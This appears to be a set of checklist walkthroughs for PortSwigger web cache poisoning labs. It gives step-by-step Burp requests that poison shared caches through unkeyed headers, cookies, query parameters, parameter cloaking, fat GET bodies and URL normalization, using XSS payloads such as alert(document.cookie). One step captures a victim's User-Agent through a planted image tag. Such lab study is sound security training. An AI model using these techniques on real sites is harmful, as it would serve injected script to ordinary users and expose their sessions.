
  

## [Web cache poisoning with an unkeyed header](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header)

  

- [ ] Load the home page with Burp running, then find the `GET /` request in Proxy > HTTP history and send it to Repeater.

- [ ] Add a cache-buster param (e.g. `?cb=1234`) and the header `X-Forwarded-Host: example.com`, then send. Confirm the response dynamically generates a script src URL using your header value (look for `/resources/js/tracking.js` loaded from your host).

- [ ] On the exploit server, create the file `/resources/js/tracking.js` with body `alert(document.cookie)` and store it.

- [ ] Back in Repeater, replace the header with `X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net` and **remove the cache buster**.

- [ ] Keep resending until you see your exploit server URL reflected in the response **and** `X-Cache: hit` in the headers — the cache is now poisoned.

- [ ] The victim auto-visits the home page every ~30s. Keep re-poisoning if the cache expires (it resets every 30s) until the lab marks as solved.

  
  

## [Web cache poisoning with an unkeyed cookie](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-cookie)

  
  

- Load the home page with Burp running, then find the `GET /` request in Proxy > HTTP history. Note the response sets a cookie `fehost=prod-cache-01`.

- [ ] Reload the home page and confirm the `fehost` cookie value is reflected inside a JS object in the response body.

- [ ] Send the `GET /` request to Repeater and add a cache-buster (e.g. `?cb=1234`).

- [ ] Change the `fehost` cookie to an arbitrary string and confirm it reflects in the response.

- [ ] Set the cookie to the XSS payload: `fehost=someString"-alert(1)-"someString` and resend until you see the payload reflected **and** `X-Cache: hit` in the headers.

- [ ] Load the URL in your browser and confirm `alert(1)` fires.

- [ ] Remove the cache-buster and keep resending to maintain the poisoned cache until the victim visits and the lab solves.

  

## [Web cache poisoning with multiple headers](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-multiple-headers)

  

- Load the home page with Burp running, then find the `GET` request for `/resources/js/tracking.js` in Proxy > HTTP history and send it to Repeater.

- [ ] Add a cache-buster (e.g. `?cb=1234`). Test `X-Forwarded-Host: example.com` alone — no effect. Then test `X-Forwarded-Scheme: nothttps` alone — you should get a `302` redirect to the same URL but with `https://`.

- [ ] Add **both** headers together: `X-Forwarded-Scheme: nothttps` and `X-Forwarded-Host: example.com`. Confirm the `302 Location` header now points to `https://example.com/resources/js/tracking.js`.

- [ ] On the exploit server, create the file `/resources/js/tracking.js` with body `alert(document.cookie)` and store it.

- [ ] Back in Repeater, set `X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net` (keep `X-Forwarded-Scheme: nothttps`). Resend until you see your exploit server URL in the `Location` header **and** `X-Cache: hit`.

- [ ] Verify the poison worked by copying the request URL and loading it in Burp's browser — you should see the script pointing to your exploit server.

- [ ] Remove the cache-buster and keep resending to maintain the poisoned cache until the victim visits and the lab solves.

  

## [Targeted web cache poisoning using an unknown header](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-targeted-using-an-unknown-header)

  

- Load the home page with Burp running, then find the `GET /` request in Proxy > HTTP history.

- [ ] Right-click the request and select **Guess headers** via the Param Miner extension. Wait for it to report the secret unkeyed header: `X-Host`.

- [ ] Send the `GET /` request to Repeater, add a cache-buster (e.g. `?cb=1234`), and add `X-Host: example.com`. Confirm the header value is used to dynamically generate the script src URL for `/resources/js/tracking.js`.

- [ ] On the exploit server, create the file `/resources/js/tracking.js` with body `alert(document.cookie)` and store it.

- [ ] Back in Repeater, set `X-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net` and resend until your exploit server URL appears in the response **and** `X-Cache: hit` in the headers. Verify `alert()` fires by loading the URL in your browser.

- [ ] Notice the response contains a `Vary: User-Agent` header — meaning the victim's `User-Agent` is part of the cache key, so you must poison the cache with **their** specific User-Agent to target them.

- [ ] Post a comment on the blog containing `<img src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo" />` to steal the victim's User-Agent.

- [ ] Open the exploit server **Access log** and refresh until you see a request from a different user. Copy their `User-Agent` value.

- [ ] Back in Repeater, paste the victim's `User-Agent` into the `User-Agent` header and remove the cache-buster.

- [ ] Keep resending until you see your exploit server URL reflected **and** `X-Cache: hit`. Keep the cache poisoned until the victim visits and the lab solves.

  

## [Web cache poisoning via an unkeyed query string](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-query)

  

- [ ] Load the home page with Burp running, find the `GET /` request in Proxy > HTTP history, and send it to Repeater.

- [ ] Add arbitrary query parameters (e.g. `?foo=bar`) and resend repeatedly — confirm you still get `X-Cache: hit`, proving the query string is not part of the cache key.

- [ ] Add an `Origin: x` header to use as a cache buster (query params can't be used here since they're unkeyed). Confirm it generates a cache miss when changed.

- [ ] On a cache miss, observe that your injected query parameters are reflected in the response body.

- [ ] Inject the XSS payload via the query string: `GET /?evil='/><script>alert(1)</script>` (keeping the `Origin` cache buster). Resend until the payload is reflected **and** `X-Cache: hit`.

- [ ] Verify the poison works for normal requests: remove the query string entirely (keep the same `Origin` buster) and confirm the cached response still contains your payload.

- [ ] Remove the `Origin` cache buster header, keep the XSS payload in the query string, and resend until you get `X-Cache: hit` — the cache is now poisoned for all users.

- [ ] Confirm by loading the plain home page in your browser and checking `alert(1)` fires.

- [ ] Keep re-poisoning every ~30 seconds until the victim visits and the lab solves.

  

## [Web cache poisoning via an unkeyed query parameter](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-param)

- [ ] Load the home page with Burp running, find the `GET /` request in Proxy > HTTP history, and send it to Repeater. Confirm that changing the query string produces a cache miss — meaning the query string is normally part of the cache key.

- [ ] Add a keyed cache-buster query parameter (e.g. `?cb=1234`) so you can probe without polluting the cache for real users.

- [ ] Use Param Miner's **Guess GET parameters** feature on the request to discover that `utm_content` is a supported but unkeyed parameter.

- [ ] Confirm `utm_content` is unkeyed by appending it alongside your cache buster (e.g. `?cb=1234&utm_content=test`) and resending — you should still get a cache hit, and the value is reflected in the response.

- [ ] Inject the XSS payload via `utm_content`: `GET /?cb=1234&utm_content='/><script>alert(1)</script>` and resend until the payload is reflected **and** `X-Cache: hit`.

- [ ] Verify the poison works for clean requests: remove `utm_content` from the URL, copy the URL, and load it in the browser — confirm `alert(1)` fires from the cached response.

- [ ] Remove the cache-buster, re-add the payload (`GET /?utm_content='/><script>alert(1)</script>`), and keep resending until you get `X-Cache: hit` — the cache is now poisoned for all users.

- [ ] Keep re-poisoning until the victim visits and the lab solves.

  

## [Parameter cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)

  - [ ]  Send `GET /js/geolocate.js?callback=setCountryCookie` to Repeater — confirm you can control the `callback` param and it's reflected in the response
- [ ]  Confirm `callback` is a **keyed** param (poisoning it directly won't affect other users)
- [ ]  Confirm `utm_content` is **excluded from the cache key** (unkeyed)
- [ ]  Use the semicolon cloaking trick to smuggle a second `callback` into the unkeyed `utm_content` param:

```
  GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)
```

- [ ]  Verify the cache key shown is just `/js/geolocate.js?callback=setCountryCookie` (the injected callback is invisible to the cache)
- [ ]  Verify the **response body** calls `alert(1)` instead of `setCountryCookie`
- [ ]  Confirm you get `X-Cache: hit` on a repeat request (response is now cached with your payload)
- [ ]  Load the home page in your browser — the page imports `geolocate.js`, triggering `alert(1)` ✅
- [ ]  Keep re-sending the poison request to maintain the cache until the victim visits — lab solves automatically
  

## [Web cache poisoning via a fat GET request](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get)

  
- [ ]  Send `GET /js/geolocate.js?callback=setCountryCookie` to Repeater — confirm the `callback` param is reflected in the response body as the called function
- [ ]  Add a request body with a duplicate `callback` param and confirm the **body value wins** over the URL param in the response:

```
  GET /js/geolocate.js?callback=setCountryCookie
  ...

  callback=arbitraryFunction
```

- [ ]  Confirm the `X-Cache-Key` still only uses the **URL param** (`/js/geolocate.js?callback=setCountryCookie`) — the body is **not keyed**
- [ ]  This means: cache stores a response for the clean URL, but the body poisons what gets cached
- [ ]  Send the poisoned request with `alert(1)` in the body:

```
  GET /js/geolocate.js?callback=setCountryCookie
  ...

  callback=alert(1)
```

- [ ]  Verify the response body now calls `alert(1)` and you get `X-Cache: miss` followed by `X-Cache: hit` on repeat ✅
- [ ]  Remove any cache-buster params from the URL so the poisoned entry matches what the victim's browser will request
- [ ]  Keep re-sending to maintain the poisoned cache entry — lab solves when the victim visits any page that imports `geolocate.js` ✅  
  

## [URL normalization](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-normalization)



- [ ]  Browse to any non-existent path (e.g. `GET /random`) in Repeater — confirm the path is reflected raw in the error response (this is your XSS sink)
- [ ]  Inject an XSS payload directly into the path in Repeater:

```
  GET /random</p><script>alert(1)</script><p>foo
```

- [ ]  Confirm the payload is reflected unencoded in the response — this works in Repeater because Burp sends the raw path without URL-encoding it
- [ ]  Understand **why the browser alone won't work**: if you paste this URL into a browser, it URL-encodes the `<>` characters, so the payload never executes and it's also a cache **miss** (different key)
- [ ]  Understand **the normalization trick**: the cache URL-decodes the path before keying it, so a browser request to the encoded URL (`%3C%2Fp%3E%3Cscript%3E...`) maps to the **same cache key** as your raw Repeater request
- [ ]  In Repeater, send the raw XSS request to poison the cache (watch for `X-Cache: miss` then `hit`)
- [ ]  **Immediately** open the URL in your browser (encoded form) — confirm `alert(1)` fires, proving the poisoned cache entry was served ✅
- [ ]  Re-poison the cache in Repeater, then **immediately** click "Deliver link to victim" in the lab and submit the URL — timing matters, do this fast
- [ ]  Lab solves when the victim visits the link and gets served the poisoned cached response ✅

**Key concept:** The cache normalizes (decodes) the URL when building the cache key, but the back-end reflects the decoded path raw — so you can poison via Repeater and have it served to any browser requesting the encoded equivalent.